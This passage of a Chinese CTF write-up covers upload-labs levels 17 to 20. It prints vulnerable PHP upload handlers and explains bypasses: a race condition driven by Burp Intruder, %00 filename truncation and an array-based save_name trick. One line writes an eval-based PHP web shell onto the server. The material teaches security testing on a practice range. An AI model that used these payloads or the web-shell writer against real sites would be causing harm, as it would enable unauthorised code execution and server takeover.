                $this-&gt;binData = $filename;
            }
            $this-&gt;size = strlen($this-&gt;binData);
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">seek</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">return</span> ($this-&gt;size - strlen($this-&gt;binData));
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">skip</span><span class="hljs-params">($skip)</span> </span>{
            $this-&gt;binData = substr($this-&gt;binData, $skip);
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readByte</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">if</span>($this-&gt;eof()) {
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;End Of File&apos;</span>);
            }
            $byte = substr($this-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>);
            $this-&gt;binData = substr($this-&gt;binData, <span class="hljs-number">1</span>);
            <span class="hljs-keyword">return</span> ord($byte);
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">readShort</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">if</span>(strlen($this-&gt;binData) &lt; <span class="hljs-number">2</span>) {
                <span class="hljs-keyword">die</span>(<span class="hljs-string">&apos;End Of File&apos;</span>);
            }
            $short = substr($this-&gt;binData, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>);
            $this-&gt;binData = substr($this-&gt;binData, <span class="hljs-number">2</span>);
            <span class="hljs-keyword">if</span>($this-&gt;order) {
                $short = (ord($short[<span class="hljs-number">1</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">0</span>]);
            } <span class="hljs-keyword">else</span> {
                $short = (ord($short[<span class="hljs-number">0</span>]) &lt;&lt; <span class="hljs-number">8</span>) + ord($short[<span class="hljs-number">1</span>]);
            }
            <span class="hljs-keyword">return</span> $short;
        }
        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">eof</span><span class="hljs-params">()</span> </span>{
            <span class="hljs-keyword">return</span> !$this-&gt;binData||(strlen($this-&gt;binData) === <span class="hljs-number">0</span>);
        }
    }
<span class="hljs-meta">?&gt;</span>
</code></pre>
<h4 id="pass-17">Pass-17</h4>
<p>&#x8FD9;&#x4E00;&#x5173;&#x63D0;&#x793A;&#x6211;&#x4EEC;&#x6E90;&#x7801;&#x5BA1;&#x8BA1;&#xFF0C;&#x770B;&#x4E86;&#x4E0B;&#x4ED6;&#x7684;&#x6E90;&#x7801;&#x53D1;&#x73B0;&#x5B58;&#x5728;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x6F0F;&#x6D1E;&#xFF0C;&#x5B83;&#x4F1A;&#x5148;&#x5C06;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#x4FDD;&#x5B58;&#xFF0C;&#x7136;&#x540E;&#x518D;&#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x7C7B;&#x578B;&#x662F;&#x5426;&#x4E3A;jpg|png|gif&#x4E2D;&#x7684;&#x4E00;&#x4E2A;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x5C31;&#x4F1A;&#x7528;unlink&#x5C06;&#x6587;&#x4EF6;&#x5220;&#x9664;&#x3002;</p>
<pre><code class="lang-php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_POST[<span class="hljs-string">&apos;submit&apos;</span>])){
    $ext_arr = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;jpg&apos;</span>,<span class="hljs-string">&apos;png&apos;</span>,<span class="hljs-string">&apos;gif&apos;</span>);
    $file_name = $_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;name&apos;</span>];
    $temp_file = $_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>];
    $file_ext = substr($file_name,strrpos($file_name,<span class="hljs-string">&quot;.&quot;</span>)+<span class="hljs-number">1</span>);
    $upload_file = UPLOAD_PATH . <span class="hljs-string">&apos;/&apos;</span> . $file_name;
    <span class="hljs-keyword">if</span>(move_uploaded_file($temp_file, $upload_file)){
        <span class="hljs-keyword">if</span>(in_array($file_ext,$ext_arr)){
             $img_path = UPLOAD_PATH . <span class="hljs-string">&apos;/&apos;</span>. rand(<span class="hljs-number">10</span>, <span class="hljs-number">99</span>).date(<span class="hljs-string">&quot;YmdHis&quot;</span>).<span class="hljs-string">&quot;.&quot;</span>.$file_ext;
             rename($upload_file, $img_path);
             $is_upload = <span class="hljs-keyword">true</span>;
        }<span class="hljs-keyword">else</span>{
            $msg = <span class="hljs-string">&quot;&#x53EA;&#x5141;&#x8BB8;&#x4E0A;&#x4F20;.jpg|.png|.gif&#x7C7B;&#x578B;&#x6587;&#x4EF6;&#xFF01;&quot;</span>;
            unlink($upload_file);
        }
    }<span class="hljs-keyword">else</span>{
        $msg = <span class="hljs-string">&apos;&#x4E0A;&#x4F20;&#x51FA;&#x9519;&#xFF01;&apos;</span>;
    }
}
</code></pre>
<p>&#x8FD9;&#x91CC;&#x6211;&#x901A;&#x8FC7;bp&#x7684;intruder&#x6A21;&#x5757;&#x6765;&#x91CD;&#x590D;&#x53D1;&#x5305;&#xFF0C;&#x5148;&#x6293;&#x4E86;&#x4E00;&#x4E2A;&#x8BBF;&#x95EE;shell.php&#x7684;bao&#xFF0C;&#x7136;&#x540E;&#x8BBE;&#x7F6E;&#x597D;Payload type&#x4E3A;Null Payloads&#xFF0C;&#x7EBF;&#x7A0B;&#x6570;&#x4E3A;50</p>
<p><img src="../images/image-20200427165037885.png" alt="image-20200427165037885"></p>
<p>&#x7136;&#x540E;shell.php&#x90A3;&#x4E2A;&#x5305;&#x6211;&#x662F;&#x7528;hackhttp&#x8FD9;&#x4E2A;&#x5E93;&#x53D1;&#x9001;&#x7684;</p>
<p><img src="../images/image-20200427165202468.png" alt="image-20200427165202468"></p>
<p>&#x5728;&#x8DD1;&#x811A;&#x672C;&#x7684;&#x540C;&#x65F6;&#x8FD0;&#x884C;intruder&#x6A21;&#x5757;&#xFF0C;&#x8FD4;&#x56DE;&#x72B6;&#x6001;&#x7801;&#x4E3A;200&#x5219;&#x8BF4;&#x660E;&#x6210;&#x529F;&#x8BBF;&#x95EE;&#x5230;shell.php</p>
<p><img src="../images/image-20200427163447698.png" alt="image-20200427163447698"></p>
<p>&#x672C;&#x6765;&#x6211;&#x662F;&#x60F3;&#x76F4;&#x63A5;&#x5199;&#x53E6;&#x4E00;&#x4E2A;&#x9A6C;&#x5230;&#x670D;&#x52A1;&#x5668;&#x7684;&#x2026;&#x4F46;&#x662F;&#x6211;&#x7684;win10&#x865A;&#x62DF;&#x4E0D;&#x77E5;&#x9053;&#x4E3A;&#x4EC0;&#x4E48;&#x62A5;&#x9519;&#xFF0C;php&#x4EE3;&#x7801;&#x5982;&#x4E0B;&#xFF1A;</p>
<pre><code>&lt;?php    fputs(fopen(&quot;../poc.php&quot;,&quot;w&quot;),&apos;&lt;?php @eval($_POST[cmd]);&apos;);?&gt;
</code></pre><p>&#x8FD9;&#x4E2A;&#x6253;&#x5F00;&#x6587;&#x4EF6;&#x6D41;&#x65F6;&#x4F1A;&#x62A5;&#x9519;&#xFF0C;&#x8DEF;&#x5F84;&#x95EE;&#x9898;&#x2026;&#x770B;&#x7684;&#x5F88;&#x8FF7;&#xFF0C;linux&#x7684;&#x73AF;&#x5883;&#x6211;&#x6CA1;&#x642D;&#xFF0C;&#x4E0B;&#x6B21;&#x8BD5;&#x8BD5;&#x518D;&#x8BD5;&#x8BD5;&#x8FD9;&#x4E2A;&#x3002;</p>
<h4 id="pass-18">Pass-18</h4>
<p>&#x55EF;&#x55EF;&#x55EF;&#xFF0C;&#x4E0D;&#x4F1A;&#xFF0C;&#x770B;&#x7F51;&#x4E0A;&#x5927;&#x4F6C;&#x7684;writeup&#x8BF4;&#x662F;&#x6761;&#x4EF6;&#x7ADE;&#x4E89;&#x7ED5;&#x8FC7;&#x6587;&#x4EF6;&#x91CD;&#x547D;&#x540D;&#x7136;&#x540E;&#x914D;&#x5408;apache&#x89E3;&#x6790;&#x6F0F;&#x6D1E;</p>
<h4 id="pass-19">Pass-19</h4>
<p>%00&#x622A;&#x65AD;&#xFF0C;&#x4FDD;&#x5B58;&#x7684;&#x6587;&#x4EF6;&#x540D;&#x53EF;&#x63A7;</p>
<blockquote>
<p>shell.php%00.jpg</p>
</blockquote>
<p><img src="../images/image-20200427171635954.png" alt="image-20200427171635954"></p>
<h4 id="pass-20">Pass-20</h4>
<p>&#x4EE3;&#x7801;&#x5BA1;&#x8BA1;</p>
<pre><code class="lang-php">$is_upload = <span class="hljs-keyword">false</span>;
$msg = <span class="hljs-keyword">null</span>;
<span class="hljs-keyword">if</span>(!<span class="hljs-keyword">empty</span>($_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>])){
    <span class="hljs-comment">//&#x68C0;&#x67E5;MIME</span>
    $allow_type = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;image/jpeg&apos;</span>,<span class="hljs-string">&apos;image/png&apos;</span>,<span class="hljs-string">&apos;image/gif&apos;</span>);
    <span class="hljs-keyword">if</span>(!in_array($_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;type&apos;</span>],$allow_type)){
        $msg = <span class="hljs-string">&quot;&#x7981;&#x6B62;&#x4E0A;&#x4F20;&#x8BE5;&#x7C7B;&#x578B;&#x6587;&#x4EF6;!&quot;</span>;
    }<span class="hljs-keyword">else</span>{
        <span class="hljs-comment">//&#x68C0;&#x67E5;&#x6587;&#x4EF6;&#x540D;</span>
        $file = <span class="hljs-keyword">empty</span>($_POST[<span class="hljs-string">&apos;save_name&apos;</span>]) ? $_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;name&apos;</span>] : $_POST[<span class="hljs-string">&apos;save_name&apos;</span>];
        <span class="hljs-keyword">if</span> (!is_array($file)) {
            $file = explode(<span class="hljs-string">&apos;.&apos;</span>, strtolower($file));
        }
        $ext = end($file);
        $allow_suffix = <span class="hljs-keyword">array</span>(<span class="hljs-string">&apos;jpg&apos;</span>,<span class="hljs-string">&apos;png&apos;</span>,<span class="hljs-string">&apos;gif&apos;</span>);
        <span class="hljs-keyword">if</span> (!in_array($ext, $allow_suffix)) {
            $msg = <span class="hljs-string">&quot;&#x7981;&#x6B62;&#x4E0A;&#x4F20;&#x8BE5;&#x540E;&#x7F00;&#x6587;&#x4EF6;!&quot;</span>;
        }<span class="hljs-keyword">else</span>{
            $file_name = reset($file) . <span class="hljs-string">&apos;.&apos;</span> . $file[count($file) - <span class="hljs-number">1</span>];
            $temp_file = $_FILES[<span class="hljs-string">&apos;upload_file&apos;</span>][<span class="hljs-string">&apos;tmp_name&apos;</span>];
            $img_path = UPLOAD_PATH . <span class="hljs-string">&apos;/&apos;</span> .$file_name;
            <span class="hljs-keyword">if</span> (move_uploaded_file($temp_file, $img_path)) {
                $msg = <span class="hljs-string">&quot;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x6210;&#x529F;&#xFF01;&quot;</span>;
                $is_upload = <span class="hljs-keyword">true</span>;
            } <span class="hljs-keyword">else</span> {
                $msg = <span class="hljs-string">&quot;&#x6587;&#x4EF6;&#x4E0A;&#x4F20;&#x5931;&#x8D25;&#xFF01;&quot;</span>;
            }
        }
    }
}<span class="hljs-keyword">else</span>{
    $msg = <span class="hljs-string">&quot;&#x8BF7;&#x9009;&#x62E9;&#x8981;&#x4E0A;&#x4F20;&#x7684;&#x6587;&#x4EF6;&#xFF01;&quot;</span>;
}
</code></pre>
<p>&#x5B83;&#x5148;&#x68C0;&#x67E5;MIME&#x7C7B;&#x578B;&#x662F;&#x5426;&#x4E3A;jpeg|png|gif&#x4E2D;&#x7684;&#x4E00;&#x79CD;&#xFF0C;&#x7136;&#x540E;&#x5224;&#x65AD;save_name&#x662F;&#x5426;&#x4E3A;&#x6570;&#x7EC4;&#xFF0C;&#x5982;&#x679C;&#x4E0D;&#x662F;&#x5C31;&#x7528;explode&#x51FD;&#x6570;&#x5C06;&#x5B83;&#x5207;&#x5206;&#x4E3A;&#x6570;&#x7EC4;&#x3002;&#x63A5;&#x7740;&#x5224;&#x65AD;&#x6587;&#x4EF6;&#x6269;&#x5C55;&#x540D;&#x7684;&#x65F6;&#x7528;&#x5230;end(save_name)&#xFF0C;&#x4E5F;&#x5C31;&#x662F;&#x6570;&#x7EC4;&#x7684;&#x6700;&#x540E;&#x4E00;&#x4E2A;&#xFF0C;&#x4F46;&#x662F;&#x4FDD;&#x5B58;&#x6587;&#x4EF6;&#x540D;&#x65F6;</p>
<p>&#x540E;&#x7F00;&#x540D;&#x7528;&#x7684;&#x662F;$file[count($file) - 1]&#x3002;&#x8FD9;&#x91CC;&#x7ED5;&#x8FC7;&#x53EA;&#x8981;&#x4F7F;end(save_name) != $file([count($file) - 1]) &#x5C31;&#x53EF;&#x4EE5;&#x4E86;&#xFF0C;&#x7136;&#x540E;&#x8FD8;&#x6709;&#x4E00;&#x4E2A;&#x7ED5;&#x8FC7;&#x70B9;&#x662F;move_uploaded_file&#x51FD;&#x6570;&#x4F1A;&#x5FFD;&#x7565;&#x6587;&#x4EF6;&#x540D;&#x672B;&#x5C3E;&#x7684;/.</p>
<blockquote>
<p>save_name[0] = shell.php/</p>
<p>save_name[2] = jpg</p>
</blockquote>
<p><img src="../images/image-20200427180106535.png" alt="image-20200427180106535"> </p>
<footer class="page-footer"><span class="copyright">Copyright &#xA9; Sec0zrc@gmail.com 2021 all right reserved&#xFF0C;powered by Gitbook</span><span class="footer-modification">&#x8BE5;&#x6587;&#x7AE0;&#x4FEE;&#x8BA2;&#x65F6;&#x95F4;&#xFF1A;
2021-06-04 16:39:00
</span></footer>
<script>console.log("plugin-popup....");document.onclick = function(e){ e.target.tagName === "IMG" && window.open(e.target.src,e.target.src)}</script><style>img{cursor:pointer}</style>
                                
                                </section>
                            
    </div>
    <div class="search-results">
        <div class="has-results">
            
            <h1 class="search-results-title"><span class='search-results-count'></span> results matching "<span class='search-query'></span>"</h1>
            <ul class="search-results-list"></ul>
            
        </div>
        <div class="no-results">
            
            <h1 class="search-results-title">No results matching "<span class='search-query'></span>"</h1>
            
        </div>
    </div>
</div>

                        </div>
                    </div>
                
            </div>

            
                
                <a href="sqli-labs-writeup.html" class="navigation navigation-prev " aria-label="Previous page: sqli-labs-writeup">
                    <i class="fa fa-angle-left"></i>
                </a>
                
                
                <a href="../工具相关/" class="navigation navigation-next " aria-label="Next page: 工具相关">
                    <i class="fa fa-angle-right"></i>
                </a>
                
            
        
    </div>

    <script>
        var gitbook = gitbook || [];
        gitbook.push(function() {
            gitbook.page.hasChanged({"page":{"typora-copy-images-to":"../images","typora-root-url":"..","title":"upload_labs writeup","level":"1.3.2","depth":2,"next":{"title":"工具相关","level":"1.4","depth":1,"path":"工具相关/README.md","ref":"工具相关/README.md","articles":[{"title":"hackbar破解和踩坑之路","level":"1.4.1","depth":2,"path":"工具相关/hackbar破解和踩坑之路.md","ref":"工具相关/hackbar破解和踩坑之路.md","articles":[]},{"title":"Ubuntu18安装使用Go","level":"1.4.2","depth":2,"path":"工具相关/Ubuntu18安装Go.md","ref":"工具相关/Ubuntu18安装Go.md","articles":[]},{"title":"nps内网穿透","level":"1.4.3","depth":2,"path":"工具相关/内网穿透.md","ref":"工具相关/内网穿透.md","articles":[]}]},"previous":{"title":"sqli-labs-writeup","level":"1.3.1","depth":2,"path":"CTFwriteup/sqli-labs-writeup.md","ref":"CTFwriteup/sqli-labs-writeup.md","articles":[]},"dir":"ltr"},"config":{"gitbook":"3.2.3","theme":"default","variables":{},"plugins":["localized-footer","-lunr","-search","search-pro","back-to-top-button","code","tbfed-pagefooter","back-to-top-button","popup","toggle-chapters","collapsible-chapters","page-toc-button","hide-element","page-toc-button","rss","github","custom-favicon"],"pluginsConfig":{"tbfed-pagefooter":{"copyright":"Copyright © Sec0zrc@gmail.com 2021","modify_label":"该文章修订时间：","modify_format":"YYYY-MM-DD HH:mm:ss"},"pluginsConfig":{"page-toc-button":{"maxTocDepth":5,"minTocSize":2}},"github":{"url":"https://github.com/zszcr/notes"},"search-pro":{},"collapsible-chapters":{},"popup":{},"localized-footer":{"filename":"FOOTER.md","hline":"true"},"code":{"copyButtons":false},"hide-element":{"elements":[".gitbook-link"]},"fontsettings":{"theme":"white","family":"sans","size":2},"rss":{"categories":["Security","Web"],"title":"Sec0zrc's knowledge base book","description":"study notes.","author":"Sec0zrc","feed_url":"http://zszcr.github.io/notes/rss","site_url":"http://zszcr.github.io/notes/","managingEditor":"Sec0zrc@gmail.com (Sec0zrc)","webMaster":"Sec0zrc@gmail.com (Sec0zrc)"},"highlight":{},"favicon":"images/favicon.png","page-toc-button":{},"back-to-top-button":{},"custom-favicon":{},"sharing":{"facebook":true,"twitter":true,"google":false,"weibo":false,"instapaper":false,"vk":false,"all":["facebook","google","twitter","weibo","instapaper"]},"theme-default":{"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"},"showLevel":false},"toggle-chapters":{}},"structure":{"langs":"LANGS.md","readme":"README.md","glossary":"GLOSSARY.md","summary":"SUMMARY.md"},"pdf":{"pageNumbers":true,"fontSize":12,"fontFamily":"Arial","paperSize":"a4","chapterMark":"pagebreak","pageBreaksBefore":"/","margin":{"right":62,"left":62,"top":56,"bottom":56}},"styles":{"website":"styles/website.css","pdf":"styles/pdf.css","epub":"styles/epub.css","mobi":"styles/mobi.css","ebook":"styles/ebook.css","print":"styles/print.css"}},"file":{"path":"CTFwriteup/upload_labs writeup.md","mtime":"2021-06-04T08:39:00.555Z","type":"markdown"},"gitbook":{"version":"3.2.3","time":"2022-07-15T13:10:31.833Z"},"basePath":"..","book":{"language":""}});
        });
    </script>
</div>

        
    <script src="../gitbook/gitbook.js"></script>
    <script src="../gitbook/theme.js"></script>
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/jquery.mark.min.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-search-pro/search.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-back-to-top-button/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-code/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-toggle-chapters/toggle.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-collapsible-chapters/collapsible-chapters.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-page-toc-button/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-hide-element/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-rss/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-github/plugin.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-sharing/buttons.js"></script>
        
    
        
        <script src="../gitbook/gitbook-plugin-fontsettings/fontsettings.js"></script>
        
    

    </body>
</html>

